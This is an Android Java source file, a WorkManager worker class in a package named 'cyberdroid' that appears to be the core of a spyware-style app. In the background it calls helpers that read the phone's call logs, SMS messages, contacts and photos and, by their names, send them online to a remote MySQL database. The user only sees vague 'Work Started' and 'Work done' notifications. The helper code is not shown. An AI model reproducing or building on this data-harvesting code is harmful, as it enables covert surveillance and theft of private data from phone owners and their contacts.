package cyberdroid.cyberdroid;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

/**
 * Created by jkm-droid on 05/04/2021.
 */

public class MyWorker extends Worker{

    public MyWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }


    //method for performing the work
    //therefore, every heavy method will be called here
    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @NonNull
    @Override
    public Result doWork() {
        show_notification("Work Started");
        MyHelper myHelper = new MyHelper(getApplicationContext());

        /*
         * call logs
         * **/
        myHelper.read_call_logs_and_send_online();

        /*
         * messages
         * **/
        myHelper.read_sms_using_telephony();
//        myHelper.read_messages_from_inbox_and_save_into_sql_database();

        myHelper.read_messages_from_sql_and_send_to_mysql_database();

        /*
        *contacts
        **/
        myHelper.read_contacts_from_phone_and_save_to_sql_lite();

        myHelper.read_contacts_from_sql_and_send_to_mysql_database();

        /*
         *images
         **/
        myHelper.read_photos_from_media_store();

        show_notification("Work done");
        return Result.success();
    }

    public void show_notification(String notificationMessage){
        NotificationManager notificationManager = (NotificationManager)getApplicationContext()
                .getSystemService(Context.NOTIFICATION_SERVICE);

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            NotificationChannel channel = new NotificationChannel("sendy getty", "sendy getty", NotificationManager.IMPORTANCE_DEFAULT);
            notificationManager.createNotificationChannel(channel);
        }

        NotificationCompat.Builder notification = new NotificationCompat.Builder(getApplicationContext(), "sendy getty")
                .setContentText(notificationMessage)
                .setSmallIcon(R.mipmap.ic_launcher);

        notificationManager.notify(1, notification.build());
    }

}
